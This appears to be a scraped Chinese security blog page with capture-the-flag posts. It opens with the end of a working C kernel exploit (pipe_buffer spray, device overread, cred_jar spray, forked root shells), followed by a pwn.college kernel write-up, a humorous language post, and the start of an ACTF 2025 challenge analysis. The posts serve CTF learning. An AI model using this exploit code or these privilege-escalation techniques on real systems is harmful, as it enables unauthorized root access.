class="line"><span class="comment">// <span class="doctag">NOTE:</span> Linux Kernel exploit template</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">//  INFO: Step 0x01: spray pipe_buffer</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe_buffer&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUMS 0x100</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> pipe_fds[PIPE_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> pipe_buf[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="type">char</span> pipe_recv[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fds[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    pipe_buf[<span class="number">0xa</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    pipe_buf[<span class="number">0xb</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    check(write(pipe_fds[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe_buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    close(pipe_fds[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fds[i][<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x02: open device</span></span><br><span class="line">  step(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = check(open(device, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;device open successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: fill pipe and close victim</span></span><br><span class="line">  step(<span class="string">&quot;fill hole and close victim&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    check(pipe(pipe_fds[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    pipe_buf[<span class="number">0xa</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    pipe_buf[<span class="number">0xb</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    check(write(pipe_fds[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;fill page hole with new pipe_buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">insn</span> <span class="title">overread</span>[] =</span> &#123;</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1008</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">14</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">11</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  info(<span class="string">&quot;prepare to overread\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *dev_recv = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(write(fd, overread, <span class="keyword">sizeof</span>(overread)));</span><br><span class="line">  check(ioctl(fd, <span class="number">0x7601</span>));</span><br><span class="line">  check(read(fd, dev_recv, <span class="number">0x4</span>));</span><br><span class="line">  dump_hex(dev_recv, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> victim = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dev_recv[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span> &amp;&amp; dev_recv[<span class="number">3</span>] == <span class="string">&#x27;e&#x27;</span>) &#123;</span><br><span class="line">    victim = (<span class="type">uint8_t</span>)dev_recv[<span class="number">0</span>];</span><br><span class="line">    success(<span class="string">&quot;find victim pipe: No.%hhu!\n&quot;</span>, victim);</span><br><span class="line">    <span class="keyword">goto</span> FOUND;</span><br><span class="line">  &#125;</span><br><span class="line">  err_exit(<span class="string">&quot;victim not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">FOUND:</span><br><span class="line">  <span class="comment">// INFO: Step 0x04: fork and root</span></span><br><span class="line">  step(<span class="string">&quot;fork and root&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check(close(pipe_fds[victim][<span class="number">0</span>]));</span><br><span class="line">  check(close(pipe_fds[victim][<span class="number">1</span>]));</span><br><span class="line">  info(<span class="string">&quot;close victim pipe\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; ++i) &#123;</span><br><span class="line">    setuid(<span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;spray cred_jar\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        shell_noerr();</span><br><span class="line">        sleep(<span class="number">0x1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;fork to root\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">insn</span> <span class="title">insns</span>[32];</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x8</span>; ++i) &#123;</span><br><span class="line">    insns[idx++] = (<span class="keyword">struct</span> insn)&#123;</span><br><span class="line">        .idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1008</span> + <span class="number">0x4</span> * i, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">    insns[idx++] =</span><br><span class="line">        (<span class="keyword">struct</span> insn)&#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">20</span> + <span class="number">24</span> * i, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">    insns[idx++] =</span><br><span class="line">        (<span class="keyword">struct</span> insn)&#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">    insns[idx++] =</span><br><span class="line">        (<span class="keyword">struct</span> insn)&#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(write(fd, insns, <span class="keyword">sizeof</span>(insns)));</span><br><span class="line">  check(ioctl(fd, <span class="number">0x7601</span>));</span><br><span class="line">  info(<span class="string">&quot;overwrite to trigger root...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    sleep(<span class="number">0x100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/21/pwncollege-ker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/21/pwncollege-ker/" class="post-title-link" itemprop="url">[pwn.college] Kernel Exploitation 解题记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-05-21 00:43:05 / Modified: 01:40:27" itemprop="dateCreated datePublished" datetime="2025-05-21T00:43:05+08:00">2025-05-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h2><p>之前总算入门了Linux Kernel Pwn,想着找几个题练练手，<del>注意到</del>pwn.college里边有这样一个专题，于是就给它AK了</p>
<blockquote>
<p>其实也就两三天的时间</p>
</blockquote>
<p><img src="/images/pwncollege-ker/winner.jpg" alt=":)"></p>
<blockquote>
<p>注：本人所有利用手法均为非预期(?)，正常解法还是得看视频复现</p>
<blockquote>
<p>不得不感叹漏洞利用技术发展之迅速，拿最新的利用手法打这种传统UAF简直降维打击</p>
</blockquote>
</blockquote>
<p>保密一下就不放Exp了，只说一下大概思路</p>
<blockquote>
<p>所有Linux版本均为<strong>v6.7.9</strong></p>
</blockquote>
<h2 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h2><p>刚开始吓我一跳，自己用<code>kmem_cache_creat</code>造了一个slab，还以为要cross cache attack<del>（记着待会要用）</del><br>仔细一分析，发现是一种最简单的UAF,很长的越界写&#x2F;读，大小为kmalloc-512（如果是kmalloc分配的话），而且获取flag不用提权，它直接读到一个堆块里边了。<br>简单审计发现好像可以堆喷该文件（&#x2F;proc&#x2F;kheap），尝试发现确实可以，直接堆喷（其实两个就够了）文件，通过越界读读取相邻存放flag堆块里边的flag</p>
<blockquote>
<p>独立slab的好处就是你能比较清楚得把控堆块排列与个数，因为一般只有该模块使用不会有其他的资源抢夺，但肯定比不上用户态heap的精准把握</p>
</blockquote>
<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><p>依旧是独立slab,这一次没有后门flag了，需要提权。<br>分析发现很长的越界写&#x2F;读直接cross-cache overflow即可，给了一个函数调用我还真不大清楚怎么用（）</p>
<p>通过pgv堆喷order-1的pages,先free第一个页，堆喷文件&#x2F;proc&#x2F;kheap占用，再free第二个页，堆喷cred_jar占用，通过越界写直接改cred_jar，成功率很高</p>
<blockquote>
<p>堆喷cred_jar用<code>setuid(1000)</code>即可，但要注意数量。由于远程是比较接近实际环境的可能要多喷射一些，本地可以少一点</p>
</blockquote>
<h2 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h2><p>依旧是独立slab,这一次没有越界读写了，这就需要cross-cache attack了。<br>其余功能还是一样，漏洞只有UAF了</p>
<p>通过构造特定数量的堆结构，并free特定堆块来填充满freelist，这样在遇到empty slab时，会调用<code>__slab_free</code>将其释放，从而得到一个page UAF原语</p>
<p>利用思路还是堆喷cred_jar并用page UAF修改，成功率很高</p>
<h2 id="challenge4-5"><a href="#challenge4-5" class="headerlink" title="challenge4 ~ 5"></a>challenge4 ~ 5</h2><blockquote>
<p>本来想好好做一下，但是不会by pass kaslr,看了PPT才知道要通过oops获取内核信息（这就是为什么很多内核题都会有panic_on_oops的设定）</p>
</blockquote>
<p>challenge4多了kaslr，不影响任何步骤，利用同challenge3<br>challenge5看都没看直接打的，貌似是少了奇怪的函数调用，但我本身就不知道怎么利用（）</p>
<h2 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h2><p>不是独立slab了，申请的堆块全都来自kmalloc-512，漏洞依旧是UAF，但是没有了读取功能，不过给了后门flag</p>
<blockquote>
<p>读都不用读，闭着眼睛往里写就行，只需一个字节</p>
</blockquote>
<p>有请<code>pipe_buffer</code>上场，给大家来点小小的page UAF震撼</p>
<p>甚至不用堆喷cred_jar，直接堆喷flag即可（flag写入了一份kmalloc-512，多喷一点很容易取走UAF page的），用pipe读取</p>
<h2 id="challenge7-8"><a href="#challenge7-8" class="headerlink" title="challenge7 ~ 8"></a>challenge7 ~ 8</h2><p>challenge7和challenge6功能和漏洞都一样，就是没有了后门flag，依然page UAF堆喷cred_jar，UAF改写即可，成功率挺高的</p>
<p>challenge8好像在<code>copy_from_user</code>之前加了一个检验<code>__check_object_size</code>，然而page UAF才不管这些:)，利用手法同上</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>只能说太伟大了page UAF &amp; cross cache，这种利用手法过于震撼了，完完全全是通杀</p>
</blockquote>
<p>新方法没学到几个，只是练习了一下老方法，有空还得看一下提供的资料PPT和视频。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/21/languages/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/21/languages/" class="post-title-link" itemprop="url">自然语言&赛博语言の奇思妙想</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-05-21 00:17:19 / Modified: 00:32:58" itemprop="dateCreated datePublished" datetime="2025-05-21T00:17:19+08:00">2025-05-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>用来记载一些日常突然迸发的奇思妙想(?)&#x2F;冷笑话之类的东西</p>
</blockquote>
<ol>
<li>x86_64汇编就像塞尔维亚语，有两套正字法。塞尔维亚语有西里尔字母和拉丁字母两种格式，而x86_64汇编有Intel和AT＆T两种正字法。（这两种我都更偏向于使用前者）</li>
</ol>
<blockquote>
<p>GNU克罗地亚，Intel塞尔维亚说成立(bushi)，赛博巴尔干这一块</p>
</blockquote>
<ol start="2">
<li><p>自然语言大多数字母系统都是大端序的，但阿拉伯字母是小端序。不过，阿拉伯字母中的立即数（数字）还是大端序的。</p>
</li>
<li><p>大家好啊，我是黏着语</p>
</li>
</ol>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">try_open</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">    <span class="keyword">self</span>.pathbuf = fs::<span class="title function_ invoke__">canonicalize</span>(&amp;<span class="keyword">self</span>.name)?;</span><br><span class="line">    <span class="keyword">self</span>.name = <span class="keyword">self</span></span><br><span class="line">        .pathbuf</span><br><span class="line">        .<span class="title function_ invoke__">file_name</span>()</span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">        .<span class="title function_ invoke__">to_str</span>()</span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">        .<span class="title function_ invoke__">to_string</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><del>出自本人某堆rust💩山</del></p>
</blockquote>
<p>有灵感还会再更新</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/14/ACTF-arandom/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/14/ACTF-arandom/" class="post-title-link" itemprop="url">[ACTF 2025] arandom复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-05-14 17:20:57" itemprop="dateCreated datePublished" datetime="2025-05-14T17:20:57+08:00">2025-05-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-05-26 00:15:29" itemprop="dateModified" datetime="2025-05-26T00:15:29+08:00">2025-05-26</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>最近复现的一个很<strong>随机</strong>的内核题，感觉学到了很多东西，特此记录一下</p>
</blockquote>
<h2 id="防护检查"><a href="#防护检查" class="headerlink" title="防护检查"></a>防护检查</h2><p>题目给了Kconfig，从中我们可以得到该内核版本为<strong>Linux 6.14.2</strong>，算很新的内核了，之前的很多手法大概率都会失效</p>
<p>启动脚本开启了kaslr，ban掉了io_uring，但是没有开启smep&#x2F;smap，意味着可以打ret2usr，仅需泄漏内核地址+控制内核执行流即可提权</p>
<blockquote>
<p>原赛题出题人&#x2F;etc目录权限搞错了，导致可以自己造一个伪&#x2F;etc&#x2F;passwd然后大大方方登陆root非预期</p>
<blockquote>
<p>内核题搞错权限见过很多次了，但是我没有一次在赛时发现过 :(</p>
</blockquote>
</blockquote>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>题目包含了一个漏洞模块arandom.ko。逆向分析逻辑很简单，最主要的函数是<code>arandom_ioctl</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">arandom_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 rand_offset; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;arandom_mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">4099</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( allocated )</span><br><span class="line">    &#123;</span><br><span class="line">      rand_offset = AAA.rand_offset;</span><br><span class="line">      v5 = <span class="number">-22LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( rand_offset + <span class="number">4</span> &lt;= (<span class="type">unsigned</span> __int64)AAA.rand_size )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        *(_DWORD *)((<span class="type">char</span> *)buffer + rand_offset) = AAA.rand_value;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0x1003</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">4100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">-14LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( copy_to_user(a3, &amp;AAA, <span class="number">12LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x1005</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = AAA.rand_offset;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)((<span class="type">char</span> *)buffer + v4) == AAA.rand_value</span><br><span class="line">          &amp;&amp; v4 == *(_QWORD *)((<span class="type">char</span> *)buffer + v4 + <span class="number">16</span>)</span><br><span class="line">          &amp;&amp; *(_QWORD *)((<span class="type">char</span> *)buffer + v4 + <span class="number">24</span>) == AAA.rand_size )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)((<span class="type">char</span> *)buffer + v4 + <span class="number">32</span>) = &amp;get_random_bytes;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_6:</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_24:</span><br><span class="line">      v5 = <span class="number">-25LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">4097</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">-1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !allocated )</span><br><span class="line">      &#123;</span><br><span class="line">        buffer = (<span class="type">void</span> *)_kmalloc_noprof(AAA.rand_size, <span class="number">3264LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( buffer )</span><br><span class="line">        &#123;</span><br><span class="line">          allocated = <span class="number">1</span>;</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">-12LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">4098</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">      v5 = <span class="number">-1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( allocated &amp;&amp; !freed )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        kfree(buffer);</span><br><span class="line">        freed = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">out:</span><br><span class="line">  mutex_unlock(&amp;arandom_mutex);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br></pre></td></tr></table></figure>

<p>有一个很明显的UAF,但是只能使用一次；还有一个地址泄漏，不过需要构造条件。其中全局变量<code>AAA</code>的类型如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arandom_params</span> // <span class="title">sizeof</span>=</span><span class="number">0xC</span></span><br><span class="line">&#123;</span><br><span class="line">    u32 rand_size;</span><br><span class="line">    u32 rand_offset;</span><br><span class="line">    u32 rand_value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其在初始化的时候被赋予了随机变量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">arandom_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  u32 v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  get_random_bytes(&amp;AAA, <span class="number">4LL</span>);</span><br><span class="line">  v0 = AAA.rand_size &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (AAA.rand_size &amp; <span class="number">0x7FFF</span>) == <span class="number">0</span> )</span><br><span class="line">    v0 = <span class="number">0x8000</span>;</span><br><span class="line">  AAA.rand_size = v0;</span><br><span class="line">  get_random_bytes(&amp;AAA.rand_offset, <span class="number">4LL</span>);</span><br><span class="line">  AAA.rand_offset %= (<span class="type">unsigned</span> __int64)AAA.rand_size - <span class="number">4</span>;</span><br><span class="line">  get_random_bytes(&amp;AAA.rand_value, <span class="number">4LL</span>);</span><br><span class="line">  misc_register(&amp;arandom_miscdev);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这是一个非常随机的题，申请随机大小的heap,并在随机位置写入随机字节（但是长度固定为DWORD）<br>仔细分析发现，<code>rand_size</code>的范围在0x0000~0x7FFF之间，而且有一半的概率落在0x7xxx的范围内；<br>这个大小在<code>kmalloc</code>中会进入<code>__kmalloc_large_noprof</code>函数（<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14.2/source/include/linux/slab.h#L897">其实大于两个页的size（0x2000）就会触发了</a>），并会进一步进入函数<code>___kmalloc_large_node</code>，最终调用函数<code>alloc_pages_node_noprof</code>，直接从buddy system中申请对应order的页</p>
<blockquote>
<p>0x7xxx大小对应的为order-3的页分配，这会一次性返回(2^3&#x3D;)8个页</p>
</blockquote>
<p>下面我们就假设申请的size为0x7xxx，即在触发order-3页分配的情况下进行进一步的利用（此时成功率大约在75%左右）</p>
<blockquote>
